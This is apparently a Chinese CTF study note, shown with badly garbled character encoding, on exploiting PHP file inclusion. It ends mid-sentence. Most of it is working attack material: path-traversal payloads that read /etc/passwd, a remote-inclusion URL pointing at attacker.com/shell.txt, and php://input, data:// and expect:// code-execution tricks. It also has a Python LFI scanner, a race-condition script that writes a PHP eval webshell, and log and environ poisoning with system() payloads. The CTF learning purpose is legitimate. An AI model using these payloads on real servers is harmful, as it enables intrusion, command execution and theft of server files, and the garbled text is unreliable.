‡æœåŠ¡å™¨é…ç½®å…è®¸è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼ˆallow_url_include=Onï¼‰ï¼Œå¯ä»¥å°è¯•åŒ…å«è¿œç¨‹æ–‡ä»¶ï¼Œä¾‹å¦‚ï¼š http://example.com/index.php?page=http://attacker.com/shell.txt å¦‚æœæœåŠ¡å™¨åŠ è½½äº†è¿œç¨‹æ–‡ä»¶çš„å†…å®¹ï¼Œè¯´æ˜å­˜åœ¨è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ ç”¨/etc/passwdæ¥æ£€éªŒæ¼æ´å­˜åœ¨ å¸¸è§çš„æµ‹è¯•æ–‡ä»¶åŒ…æ‹¬ï¼š /etc/passwdï¼ˆLinuxç³»ç»Ÿç”¨æˆ·ä¿¡æ¯ï¼‰ /etc/hostsï¼ˆä¸»æœºåé…ç½®ï¼‰ /proc/self/environï¼ˆç¯å¢ƒå˜é‡ï¼‰ Apache/Nginxæ—¥å¿—æ–‡ä»¶ï¼ˆå¦‚/var/log/apache2/access.logï¼‰ /etc/passwd æ–‡ä»¶åŒ…å« root: å…³é”®å­—ï¼Œå¦‚æœè¿”å› root:x:0:0: è¯´æ˜è¯»å–æˆåŠŸ è·¯å¾„éå† http://target.com/index.php?file=../../../../../../etc/passwd ä¹Ÿå¯ç”¨pythonè„šæœ¬ import requests# ç›®æ ‡ URLurl = http://target.com/index.php?file=# å¸¸è§çš„ LFI è·¯å¾„éå†payloads = [ ../../../../../../etc/passwd, ..//..//..//..//..//..//etc/passwd, # åŒæ–œæ ç»•è¿‡ ....//....//....//....//etc/passwd, # å¤šç‚¹æ–œæ ç»•è¿‡]# å‘é€è¯·æ±‚for payload in payloads: full_url = url + payload response = requests.get(full_url) if root:x:0:0: in response.text: print(f[+] æˆåŠŸï¼LFI å­˜åœ¨: full_url) print(response.text[:200]) # ä»…æ˜¾ç¤ºéƒ¨åˆ†å†…å®¹ break else: print(f[-] å¤±è´¥: full_url) åˆ©ç”¨ php://filter è¿›è¡Œ Base64 ç¼–ç  http://target.com/index.php?file=php://filter/convert.base64-encode/resource=/etc/passwd Null Byte æˆªæ–­ï¼ˆPHP 5.3.4ï¼‰ å¦‚æœæœåŠ¡å™¨å¼ºåˆ¶ .php åç¼€ï¼š http://target.com/index.php?file=../../../../../etc/passwd%00 PATH_INFO æˆªæ–­ http://target.com/index.php?file=../../../../../../etc/passwd.................... åŒ…å«æ–¹æ³• phpä¼ªåè®® 1 file:// â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ2 http:// â€” è®¿é—® HTTP(s) ç½‘å€3 ftp:// â€” è®¿é—® FTP(s) URLs4 php:// â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµ(I/O streams)5 zlib:// â€” å‹ç¼©æµ6 data:// â€” æ•°æ®(RFC 2397)7 glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼8 phar:// â€” PHP å½’æ¡£9 ssh2:// â€” Secure Shell 210 rar:// â€” RAR11 ogg:// â€” éŸ³é¢‘æµ12 expect:// â€” å¤„ç†äº¤äº’å¼çš„æµ file:// è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œè‹¥ä¸åŠ åè®®åç§°ï¼Œé»˜è®¤å°è£…åè®®ä¸ºfile://åè®® æ¡ä»¶ allow_url_fopen:off/on allow_url_include :off/on ä½œç”¨ ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼ˆæœåŠ¡å™¨ä¸­çš„æ–‡ä»¶ï¼‰ åœ¨CTFä¸­é€šå¸¸ç”¨æ¥è¯»å–æœ¬åœ°æ–‡ä»¶çš„ä¸”ä¸å—allow_url_fopenä¸allow_url_includeçš„å½±å“ æ³¨ï¼šä½¿ç”¨fileåè®®æ—¶æ— æ³•ä½¿ç”¨ç›¸å¯¹è·¯å¾„ cmd=file://flag #ç”¨æ³•é”™è¯¯ï¼Œå£°æ˜fileåè®®æ—¶æ— æ³•ä½¿ç”¨ç›¸å¯¹è·¯å¾„cmd=file:///flag #ç”¨æ³•æ­£ç¡®ï¼Œä½¿ç”¨ç»å¯¹è·¯å¾„cmd=/flag #ç”¨æ³•æ­£ç¡®ï¼Œä½¿ç”¨ç»å¯¹è·¯å¾„cmd=flag #ç”¨æ³•æ­£ç¡®ï¼Œä½¿ç”¨ç›¸å¯¹è·¯å¾„ ä½¿ç”¨å®ä¾‹ #Linuxcmd=file:///path/to/flag #æ ¹ç›®å½•ä¸‹pathæ–‡ä»¶å¤¹ä¸­toæ–‡ä»¶å¤¹ä¸‹flagæ–‡ä»¶ â€”â€”æ­¤å¤„æœ‰///ä¸‰æ¡cmd=/path/to/flag #æ ¹ç›®å½•ä¸‹pathæ–‡ä»¶å¤¹ä¸­toæ–‡ä»¶å¤¹ä¸‹flagæ–‡ä»¶cmd=relative/path/flag #å½“å‰ç›®å½•ä¸‹relativeæ–‡ä»¶å¤¹ä¸­pathæ–‡ä»¶å¤¹ä¸‹flagæ–‡ä»¶cmd=flag #å½“å‰ç›®å½•ä¸‹çš„flagæ–‡ä»¶#Windowscmd=file://C:/path/to/flag #Cç›˜ä¸­pathæ–‡ä»¶å¤¹ä¸­toæ–‡ä»¶å¤¹ä¸‹flagæ–‡ä»¶cmd=file://C:\\path\\to\\flag #Cç›˜ä¸­pathæ–‡ä»¶å¤¹ä¸­toæ–‡ä»¶å¤¹ä¸‹flagæ–‡ä»¶cmd=C:\\path\\to\\flag #Cç›˜ä¸­pathæ–‡ä»¶å¤¹ä¸­toæ–‡ä»¶å¤¹ä¸‹flagæ–‡ä»¶cmd=flag #å½“å‰æ–‡ä»¶å¤¹ä¸‹flagæ–‡ä»¶ http:// è®¿é—® HTTP(s) ç½‘å€ æ¡ä»¶ allow_url_fopen:on allow_url_include:on ä½œç”¨ å¸¸è§„ URL å½¢å¼ï¼Œå…è®¸é€šè¿‡ HTTP 1.0 çš„ GETæ–¹æ³•ï¼Œä»¥åªè¯»è®¿é—®æ–‡ä»¶æˆ–èµ„æºã€‚CTFä¸­é€šå¸¸ç”¨äºè¿œç¨‹åŒ…å« ä½¿ç”¨å®ä¾‹ cmd=http://example.com/phpinfo.txt #è¯»å–http://example.com/phpinfo.txtæ–‡ä»¶cmd=https://example.com/file.php?var1=val1var2=val2 #è¯»å–https://example.com/file.phpæ–‡ä»¶å¹¶ä¸”ä¼ å…¥var1å’Œvar2çš„å€¼ php:// è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµ(I/O streams)ï¼Œä¼ªåè®®æä¾›äº†å¤šç§ä¸åŒçš„æ–¹å¼æ¥è®¿é—®å’Œå¤„ç†æ•°æ® å¸¸è§ php://input #è¿™ä¸ªä¼ªåè®®ç”¨äºè®¿é—®HTTPè¯·æ±‚çš„åŸå§‹ä¸»ä½“æ•°æ®ã€‚å®ƒé€šå¸¸ç”¨äºä»POSTè¯·æ±‚ä¸­è¯»å–æ•°æ®ã€‚php://output #è¿™ä¸ªä¼ªåè®®ç”¨äºè®¿é—®HTTPå“åº”çš„è¾“å‡ºæµã€‚å®ƒé€šå¸¸ç”¨äºå‘å®¢æˆ·ç«¯å‘é€æ•°æ®ã€‚php://stdin #ç”¨äºè®¿é—®æ ‡å‡†è¾“å…¥æµã€‚php://stdout #ç”¨äºè®¿é—®æ ‡å‡†è¾“å‡ºæµã€‚php://stderr #ç”¨äºè®¿é—®æ ‡å‡†é”™è¯¯è¾“å‡ºæµã€‚php://temp #ç”¨äºä¸´æ—¶å­˜å‚¨æ•°æ®çš„å†…å­˜æµã€‚å®ƒå¯ä»¥ç”¨äºåœ¨æ²¡æœ‰åˆ›å»ºå®é™…æ–‡ä»¶çš„æƒ…å†µä¸‹å¤„ç†ä¸´æ—¶æ•°æ®ã€‚php://memory #ç”¨äºåœ¨å†…å­˜ä¸­åˆ›å»ºå¯è¯»å†™çš„æ•°æ®æµã€‚php://filter #è¿™ä¸ªä¼ªåè®®ç”¨äºæ•°æ®è¿‡æ»¤å’Œè½¬æ¢ã€‚å®ƒå…è®¸æ‚¨å°†ä¸åŒçš„è¿‡æ»¤å™¨åº”ç”¨äºæ•°æ®æµï¼Œä¾‹å¦‚Base64ç¼–ç ã€å‹ç¼©å’ŒåŠ å¯†ç­‰ã€‚php://globals #ç”¨äºè®¿é—®å…¨å±€å˜é‡ã€‚å¯ä»¥é€šè¿‡æ­¤ä¼ªåè®®æŸ¥çœ‹å’Œä¿®æ”¹PHPå…¨å±€å˜é‡çš„å€¼ã€‚php://fd #ç”¨äºè®¿é—®æ–‡ä»¶æè¿°ç¬¦ã€‚å®ƒå…è®¸æ‚¨åœ¨PHPä¸­è®¿é—®åº•å±‚æ–‡ä»¶ç³»ç»Ÿã€‚ åœ¨CTFä¸­ç»å¸¸ä½¿ç”¨çš„æ˜¯**php://filterå’Œphp://input**ã€php://filterç”¨äºè¯»å–æºç ï¼Œphp://inputç”¨äºæ‰§è¡ŒPOSTå‚æ•°ä¸­çš„phpä»£ç  æ¡ä»¶ allow_url_fopen:off/on allow_url_include :ä»…php://input ã€php://stdinã€php://memoryã€php://temp éœ€è¦on php://input æ¡ä»¶ allow_url_fopen:off/on allow_url_include :on GET[URLéƒ¨åˆ†]?file=php://inputPOST[POST DATAéƒ¨åˆ†]? phpinfo();? ä½œç”¨ ä¸»è¦ç”¨æ¥æ¥æ”¶postæ•°æ® CTFä¸­æ–‡ä»¶åŒ…å«é¢˜ç›®é‡Œï¼Œå¯ä»¥ä½¿ç”¨php://inputåè®®ï¼Œå°†postè¯·æ±‚ä¸­çš„æ•°æ®ä½œä¸ºphpä»£ç æ‰§è¡Œ php://filter æ¡ä»¶ allow_url_fopen:off/on allow_url_include :off/on ä½œç”¨ å¯ä»¥ä½œä¸ºä¸€ä¸ªä½äºåŸå§‹æ•°æ®æµå’Œæœ€ç»ˆç›®æ ‡ä¹‹é—´çš„ä¸­é—´æµæ¥å¤„ç†å…¶ä»–æµï¼Œè´Ÿè´£å¯¹æ•°æ®è¿›è¡Œå¤„ç†ï¼ˆå³è¯»å–æˆ–å†™å…¥æ•°æ®ä¹‹å‰å¯¹å…¶è¿›è¡Œä¿®æ”¹æˆ–è¿‡æ»¤ï¼‰ åç§° æè¿° resource=è¦è¿‡æ»¤çš„æ•°æ®æµ è¿™ä¸ªå‚æ•°æ˜¯å¿…é¡»çš„ã€‚å®ƒæŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚ï¼ˆåŠ ç»å¯¹è·¯å¾„ï¼‰ read=è¯»é“¾çš„ç­›é€‰åˆ—è¡¨ readå‚æ•°æŒ‡å®š ä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨ ç”¨äºè¯»æ“ä½œï¼Œå¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦åˆ†éš”ã€‚ï¼ˆè¯»å–æ–‡ä»¶åç¼–ç è¾“å‡ºï¼‰ write=å†™é“¾çš„ç­›é€‰åˆ—è¡¨ writeå‚æ•°æŒ‡å®š ä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨ ç”¨äºå†™æ“ä½œï¼Œå¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦åˆ†éš”ã€‚ï¼ˆç¼–ç é‡å†™å…¥æ–‡ä»¶ï¼‰ ï¼›ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨ ä»»ä½•æ²¡æœ‰ä»¥ read= æˆ– write= ä½œå‰ç¼€çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚ æ³¨ï¼š read å’Œ write æŒ‡ä»¤æ˜¯äº’æ–¥çš„ï¼Œä¸èƒ½åŒæ—¶ä½¿ç”¨ã€‚ å¦‚æœå­˜åœ¨å¤šä¸ªè¿‡æ»¤å™¨ï¼Œå­—ç¬¦ä¸²ä»å·¦åˆ°å³çš„é¡ºåºç»è¿‡è¿‡æ»¤å™¨ å¸¸ç”¨è¿‡æ»¤è¯­å¥ ?file=php://filter/read=convert.base64-encode/resource=/flag //è¯»å–æ ¹ç›®å½•flagæ–‡ä»¶ï¼Œè¿›è¡Œbase64ç¼–ç  å¸¸ç”¨è¿‡æ»¤å™¨(æœªå®Œ) å­—ç¬¦ä¸²è¿‡æ»¤å™¨ PHP: å­—ç¬¦ä¸²è¿‡æ»¤å™¨ - Manual string.rot13ï¼ˆå¯¹å­—ç¬¦ä¸²æ‰§è¡ŒROT13ç¼–ç è½¬æ¢ï¼‰ string.toupperï¼ˆå°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºå¤§å†™ï¼‰ string.tolowerï¼ˆå°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºå°å†™ï¼‰ string.strip_tags(è‡ª PHP 7.3.0 èµ·åºŸå¼ƒï¼Œä»å­—ç¬¦ä¸²ä¸­å»é™¤ HTML å’Œ PHP æ ‡è®°) è½¬æ¢è¿‡æ»¤å™¨ PHP: è½¬æ¢è¿‡æ»¤å™¨ - Manual æ³¨ï¼šè½¬æ¢è¿‡æ»¤å™¨æ˜¯ PHP 5.0.0 æ·»åŠ çš„ å¸¸ç”¨ï¼šconvert.base64-encodeå’Œconvert.base64-decodeï¼ˆå°†å­—ç¬¦ä¸²è¿›è¡Œbase64ç¼–ç åŠ è§£å¯†ï¼‰ convert.quoted-printable-encode å’Œ convert.quoted-printable-decodeï¼ˆå°†å­—ç¬¦ä¸²è¿›è¡ŒQuoted-printableç¼–ç åŠ è§£å¯†ï¼‰ convert.iconv.*ï¼ˆå°†å­—ç¬¦ä¸²è¿›è¡Œå­—ç¬¦ç¼–ç è½¬åŒ–ï¼‰ Quoted-Printableï¼ˆQPï¼‰ç¼–ç  æ˜¯ä¸€ç§ å¯è¯»æ€§è¾ƒé«˜çš„7ä½ç¼–ç ï¼Œç”¨äºå®‰å…¨ä¼ è¾“åŒ…å« ç‰¹æ®Šå­—ç¬¦ï¼ˆå¦‚é ASCII å­—ç¬¦ï¼‰çš„æ–‡æœ¬ï¼Œå°¤å…¶æ˜¯åœ¨ ç”µå­é‚®ä»¶ï¼ˆMIMEï¼‰ ä¸­ã€‚å®ƒçš„ä¸»è¦ç›®çš„æ˜¯åœ¨ å…¼å®¹ 7-bit ä¼ è¾“åè®®ï¼ˆå¦‚ SMTPï¼‰çš„åŒæ—¶ï¼Œä¿æŒå°½å¯èƒ½çš„å¯è¯»æ€§ ç¼–ç è§„åˆ™ï¼š ASCII å¯æ‰“å°å­—ç¬¦ï¼ˆ33-126ï¼‰ ç›´æ¥ä¿ç•™ï¼Œå¦‚ abcXYZ123 ç©ºæ ¼å’Œåˆ¶è¡¨ç¬¦ï¼ˆTABï¼‰ æœ«å°¾ç©ºæ ¼å¿…é¡»ç”¨ =20 è¡¨ç¤ºï¼ˆé˜²æ­¢é‚®ä»¶å®¢æˆ·ç«¯è‡ªåŠ¨å»æ‰ï¼‰ ä¸å¯æ‰“å°å­—ç¬¦ï¼ˆ0-31, 127-255ï¼‰ï¼Œä½¿ç”¨ =XX å½¢å¼ç¼–ç ï¼Œå…¶ä¸­ XX æ˜¯ ä¸¤ä½åå…­è¿›åˆ¶è¡¨ç¤º æ¢è¡Œç¬¦ï¼ˆCRLF, \\r ï¼‰ QP é»˜è®¤ä½¿ç”¨ \\r ä½œä¸ºæ¢è¡Œç¬¦ é•¿äº 76 ä¸ªå­—ç¬¦ çš„è¡Œå¿…é¡» æ¢è¡Œï¼Œå¹¶åœ¨è¡Œå°¾åŠ  = ä½œä¸ºè½¯æ¢è¡Œ phar:// åˆ©ç”¨æ¡ä»¶ phpç‰ˆæœ¬å¤§äºç­‰äºphp5.3.0 allow_url_fopen = On allow_url_include = On åŸç† phar:// æ˜¯ç”¨æ¥è§£å‹çš„ä¼ªåè®® phar://ä¸ç®¡å‚æ•°ä¸­æ˜¯ä»€ä¹ˆæ‹“å±•åï¼Œéƒ½ä¼šè¢«å½“åšå‹ç¼©åŒ… ç”¨æ³• ?file=phar://å‹ç¼©åŒ…/å‹ç¼©æ–‡ä»¶ ç¤ºä¾‹ phar://xxx.png/shell.php å†™ä¸€ä¸ªæœ¨é©¬æ–‡ä»¶shell.phpï¼Œç„¶åç”¨zip://ä¼ªåè®®å‹ç¼©æˆshell.zipï¼Œæœ€åä¿®æ”¹åç¼€åä¸º.pngï¼Œä¸Šä¼ å›¾ç‰‡ è¾“å…¥æµ‹è¯•ï¼šhttp://www.abc.com/xxx/file.php?file=phar://shell.png/shell.php è¿™æ ·phar://å°±ä¼šå°†pngå½“åšzipå‹ç¼©åŒ…è¿›è¡Œè§£å‹ï¼Œå¹¶ä¸”è®¿é—®è§£å‹åçš„shell.phpæ–‡ä»¶ zip:// åˆ©ç”¨æ¡ä»¶ phpç‰ˆæœ¬å¤§äºç­‰äºphp5.3.0 allow_url_fopen = On allow_url_include = On å’Œphar://ä¼ªåè®®åŸç†ç±»ä¼¼ï¼Œä½†ç”¨æ³•ä¸åŒ ç”¨æ³• ?file=zip://[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]#[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å] æ³¨æ„ï¼šéœ€è¦å°†#è½¬æ¢æˆURLç¼–ç ï¼š%23 zip:// bzip2:// zlib:// å‡å±äºå‹ç¼©æµï¼Œå¯ä»¥è®¿é—®å‹ç¼©æ–‡ä»¶ä¸­çš„å­æ–‡ä»¶ï¼Œæ›´é‡è¦çš„æ˜¯ä¸éœ€è¦æŒ‡å®šåç¼€åï¼Œå¯ä¿®æ”¹ä¸ºä»»æ„åç¼€ï¼šjpgã€pngã€gifç­‰ç­‰ã€‚ æ³¨ï¼šzlib:// éœ€è¦æ˜¯æœåŠ¡å™¨å†…çš„å‹ç¼©åŒ…æ–‡ä»¶ã€ä½†ä¸å±€é™äºåç¼€å ç¤ºä¾‹ 1.zip://[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]#[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å] å‹ç¼© phpinfo.txt ä¸º phpinfo.zip ï¼Œå‹ç¼©åŒ…é‡å‘½åä¸º phpinfo.jpg ï¼Œå¹¶ä¸Šä¼ ç›®å½•/var/www/html/ï¼Œä»¥fileä¸ºæ–‡ä»¶åŒ…å«çš„å‚æ•°ä¸ºä¾‹ï¼š ?file=zip:///var/www/html/phpinfo.jpg#phpinfo.txt 2.compress.bzip2://file.bz2 å‹ç¼© phpinfo.txt ä¸º phpinfo.bz2 å¹¶ä¸Šä¼ (åŒæ ·æ”¯æŒä»»æ„åç¼€å)ï¼Œå¹¶ä¸Šä¼ ç›®å½•/var/www/html/ï¼Œä»¥fileä¸ºæ–‡ä»¶åŒ…å«çš„å‚æ•°ä¸ºä¾‹ï¼š ?file=compress.bzip2:///var/www/html/phpinfo.bz2 3.compress.zlib://file.gz å‹ç¼© phpinfo.txt ä¸º phpinfo.gz å¹¶ä¸Šä¼ (åŒæ ·æ”¯æŒä»»æ„åç¼€å)ï¼Œå¹¶ä¸Šä¼ ç›®å½•/var/www/html/ï¼Œä»¥fileä¸ºæ–‡ä»¶åŒ…å«çš„å‚æ•°ä¸ºä¾‹ï¼š ?file=compress.zlib:///var/www/html/phpinfo.gz data:// æ¡ä»¶ phpç‰ˆæœ¬å¤§äºç­‰äºphp5.2 allow_url_fopen = On allow_url_include = On ç”¨æ³• data://text/plain,[åŠ ä¸Šæ‰€éœ€ä¼ è¾“çš„ç»è¿‡urlç¼–ç æ•°æ®] http://127.0.0.1/include.php?file=data://text/plain,?php%20phpinfo();? data://text/plain;base64,[åŠ ä¸Šæ‰€éœ€ä¼ è¾“çš„ç»è¿‡base64ç¼–ç å†ç»è¿‡urlç¼–ç çš„æ•°æ®] http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b æ³¨ï¼šåŠ å· + çš„urlç¼–ç ä¸º%2bï¼ŒPD9waHAgcGhwaW5mbygpOz8%2bçš„base64è§£ç ä¸ºï¼š ?php phpinfo();? expect:// PHPè¦å®‰è£…expectæ‰©å±• http://example.com/index.php?file=php:expect://idhttp://example.com/index.php?file=php:expect://ls åŒ…å«session Sessionæ–‡ä»¶åŒ…å«æ¼æ´-ç®€ä¹¦ åˆ©ç”¨æ¡ä»¶ sessionæ–‡ä»¶è·¯å¾„å·²çŸ¥ï¼Œä¸”å…¶ä¸­å†…å®¹éƒ¨åˆ†å¯æ§ è¿‡æ»¤äº†ç‚¹ä¹‹åä¸èƒ½ä½¿ç”¨æ–‡ä»¶åŒ…å«æ¥getshelläº†ï¼Œèƒ½åˆ©ç”¨æ— åç¼€çš„æ–‡ä»¶sessionï¼Œåˆ©ç”¨session.upload_progressæ¥è¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œåˆ©ç”¨PHP_SESSION_UPLOAD_PROGRESSå‚æ•° åŸºç¡€çŸ¥è¯† ä¸€äº›é…ç½®é€‰é¡¹ è¯¥åŠŸèƒ½æ˜¯åœ¨php5.4æ·»åŠ çš„ï¼Œé¦–å…ˆå…ˆäº†è§£ä¸‹php.iniä»¥ä¸‹çš„å‡ ä¸ªé»˜è®¤é€‰é¡¹ session.upload_progress.enable = onsession.upload_progress.cleanup = onsession.upload_progress.prefix = upload_progress_session.upload_progress.name = PHP_SESSION_UPLOAD_PROGRESS enable = onè¡¨ç¤ºupload_progressåŠŸèƒ½å¼€å§‹ï¼Œä¹Ÿæ„å‘³ç€å½“æµè§ˆå™¨å‘æœåŠ¡å™¨ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œphpå°†ä¼šæŠŠæ­¤æ¬¡æ–‡ä»¶ä¸Šä¼ çš„è¯¦ç»†ä¿¡æ¯(å¦‚ä¸Šä¼ æ—¶é—´ã€ä¸Šä¼ è¿›åº¦ç­‰)å­˜å‚¨åœ¨sessionå½“ä¸­ ï¼› cleanup = onè¡¨ç¤ºå½“æ–‡ä»¶ä¸Šä¼ ç»“æŸåï¼Œphpå°†ä¼šç«‹å³æ¸…ç©ºå¯¹åº”sessionæ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œè¿™ä¸ªé€‰é¡¹éå¸¸é‡è¦ï¼›cleanupé€‰é¡¹å†³å®šäº†æˆ‘ä»¬éœ€è¦æ¡ä»¶ç«äº‰ nameå½“å®ƒå‡ºç°åœ¨è¡¨å•ä¸­ï¼Œphpå°†ä¼šæŠ¥å‘Šä¸Šä¼ è¿›åº¦ï¼Œæœ€å¤§çš„å¥½å¤„æ˜¯ï¼Œå®ƒçš„å€¼å¯æ§ï¼› prefix+nameå°†è¡¨ç¤ºä¸ºsessionä¸­çš„é”®å; session.auto_startï¼šé»˜è®¤ä¸ºoffï¼Œè‹¥ä¸ºonï¼Œphpä¼šåœ¨æ¥æ”¶è¯·æ±‚çš„æ—¶å€™ä¼šè‡ªåŠ¨åˆå§‹åŒ–Sessionï¼Œä¸å†éœ€è¦æ‰§è¡Œsession_start() session.use_strict_modeï¼šé»˜è®¤å€¼ä¸º0ï¼Œæ­¤æ—¶ç”¨æˆ·å¯ä»¥è‡ªå®šä¹‰Sesssion IDï¼ˆé»˜è®¤æƒ…å†µä¸‹ï¼ŒPHPå…è®¸**ä»»ä½•å®¢æˆ·ç«¯ä½¿ç”¨ PHPSESSID å‘é€è¯·æ±‚å¹¶æ¢å¤ä¼šè¯ï¼Œ**å¦‚æœæ”»å‡»è€…æå‰çŒœæµ‹æˆ–è®¾ç½®äº†PHPSESSIDï¼Œåˆ™å¯èƒ½åŠ«æŒç”¨æˆ·çš„ä¼šè¯ï¼‰ï¼Œæ¯”å¦‚ï¼Œæˆ‘ä»¬åœ¨Cookieé‡Œè®¾ç½®PHPSESSID=ROISï¼ŒPHPå°†ä¼šåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶/tmp/sess_ROISã€‚å³ä½¿æ­¤æ—¶ç”¨æˆ·æ²¡æœ‰åˆå§‹åŒ–Sessionï¼ŒPHPä¹Ÿä¼šè‡ªåŠ¨åˆå§‹åŒ–Sessionã€‚ å¹¶äº§ç”Ÿä¸€ä¸ªé”®å€¼ï¼Œè¿™ä¸ªé”®å€¼æœ‰ini.get(â€œsession.upload_progress.prefixâ€)+ç”±æˆ‘ä»¬æ„é€ çš„session.upload_progress.nameå€¼ç»„æˆï¼Œæœ€åè¢«å†™å…¥sess_æ–‡ä»¶é‡Œ æ³¨ï¼šç”±äºcleanup=onï¼Œä¼šå¯¼è‡´æ–‡ä»¶ä¸Šä¼ åï¼Œsessionæ–‡ä»¶çš„å†…å®¹ç«‹å³æ¸…ç©ºã€‚æ­¤æ—¶æˆ‘ä»¬å¾—åˆ©ç”¨æ¡ä»¶ç«äº‰ï¼Œåœ¨sessionæ–‡ä»¶çš„å†…å®¹è¢«æ¸…ç©ºå‰è¿›è¡Œæ–‡ä»¶åŒ…å« å¸¸è§çš„php-sessionå­˜æ”¾ä½ç½® /var/lib/php/sess_PHPSESSID /var/lib/php/sessions/sess_PHPSESSID /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID åˆ©ç”¨ pythonè„šæœ¬ import ioimport sysimport requestsimport threadingsessid = Qftmdef POST(session): while True: f = io.BytesIO(ba * 1024 * 50) session.post( http://250307c3-cf87-4811-987f-20189fa2442c.chall.ctf.show/, data=PHP_SESSION_UPLOAD_PROGRESS:?php system(cat *);fputs(fopen(shell.php,w),?php @eval($_POST[mtfQ])?);?, files=file:(q.txt, f), cookies=PHPSESSID:sessid )def READ(session): while True: response = session.get(fhttp://250307c3-cf87-4811-987f-20189fa2442c.chall.ctf.show/?file=/tmp/sess_sessid) if flag not in response.text: print([+++]retry) else: print(response.text) sys.exit(0)with requests.session() as session: t1 = threading.Thread(target=POST, args=(session, )) t1.daemon = True t1.start() READ(session) åŒ…å«æ—¥å¿— è®¿é—®æ—¥å¿— åˆ©ç”¨æ¡ä»¶ éœ€è¦çŸ¥é“æœåŠ¡å™¨æ—¥å¿—çš„å­˜å‚¨è·¯å¾„ï¼Œä¸”æ—¥å¿—æ–‡ä»¶å¯è¯» æ—¥å¿—ä½ç½® nginxï¼š/var/log/nginx/access.log apacheï¼š/var/log/apache2/access_log(access.log) æ³¨ï¼šåœ¨CTFä¸­ï¼Œlogçš„åœ°å€å¸¸è¢«ä¿®æ”¹æ‰ï¼Œå¯ä»¥é€šè¿‡è¯»å–ç›¸åº”çš„é…ç½®æ–‡ä»¶åï¼Œå†è¿›è¡ŒåŒ…å« payloadæ’å…¥ ä½ç½®ï¼šUser-Agentå¤´ï¼ŒGETå‚æ•° User-Agentå¤´ä¸éœ€è¦æŠ“åŒ…è§£ç ï¼ŒGETå‚æ•°éœ€è¦ã€‚ æœ€ågetshellå³å¯ SSH log SSHï¼ˆSecure Shellï¼‰æ˜¯ä¸€ç§åŠ å¯†åè®®ï¼Œä¸»è¦ç”¨äºè¿œç¨‹å®‰å…¨ç™»å½•å’ŒæœåŠ¡å™¨ç®¡ç† åˆ©ç”¨æ¡ä»¶ éœ€è¦çŸ¥é“ssh-logçš„ä½ç½®ï¼Œä¸”å¯è¯»ã€‚é»˜è®¤æƒ…å†µä¸‹ä¸º/var/log/auth.log ubuntuä¸­ï¼šssh '?php phpinfo(); ?'@remotehost ä¹‹åä¼šæç¤ºè¾“å…¥å¯†ç ç­‰ç­‰ï¼Œéšä¾¿è¾“å…¥ã€‚ ç„¶ååœ¨remotehostçš„ssh-logä¸­å³å¯å†™å…¥phpä»£ç  åŒ…å«environï¼ˆç¯å¢ƒå˜é‡ï¼‰ åˆ©ç”¨æ¡ä»¶ phpä»¥cgiæ–¹å¼è¿è¡Œï¼Œè¿™æ ·environæ‰ä¼šä¿æŒUAå¤´ã€‚ environæ–‡ä»¶å­˜å‚¨ä½ç½®å·²çŸ¥ï¼Œä¸”environæ–‡ä»¶å¯è¯»ã€‚ åˆ©ç”¨ å¦‚æœä¸€ä¸ª Web æœåŠ¡å™¨æœ‰ LFIï¼ˆæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼‰æ¼æ´ï¼Œä½† php://filterã€log poisoning éƒ½ä¸å¯ç”¨ï¼Œé‚£ä¹ˆ /proc/self/environ å¯èƒ½æ˜¯æœ€åçš„å¸Œæœ› å¦‚æœç›®æ ‡æœåŠ¡å™¨è¿è¡Œ PHPï¼Œå¹¶ä¸” $_SERVER['HTTP_USER_AGENT'] è¢«å†™å…¥ç¯å¢ƒå˜é‡ï¼Œå¯ä»¥å°è¯•åœ¨ User-Agent å¤´ä¸­æ³¨å…¥æ¶æ„ä»£ç ï¼š GET /?file=/proc/self/environ HTTP/1.1Host: target.comUser-Agent: ?php system($_GET[cmd]); ? ç„¶åè®¿é—®http://target.com/?file=/proc/self/environcmd=whoami åŒ…å«fd è·ŸåŒ…å«environç±»ä¼¼ åŒ…å«ä¸´æ—¶æ–‡ä»¶ åŒæ ·è¦ç«äº‰ åŒ…å«ä¸Šä¼ æ–‡ä»¶ é…åˆæ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼ŒåŸºæœ¬åŸç†ä¸å˜ åŒ…å«pearcmd pearcmd.php æ˜¯ PHP PEARï¼ˆPHP Extension and Application Repositoryï¼‰ 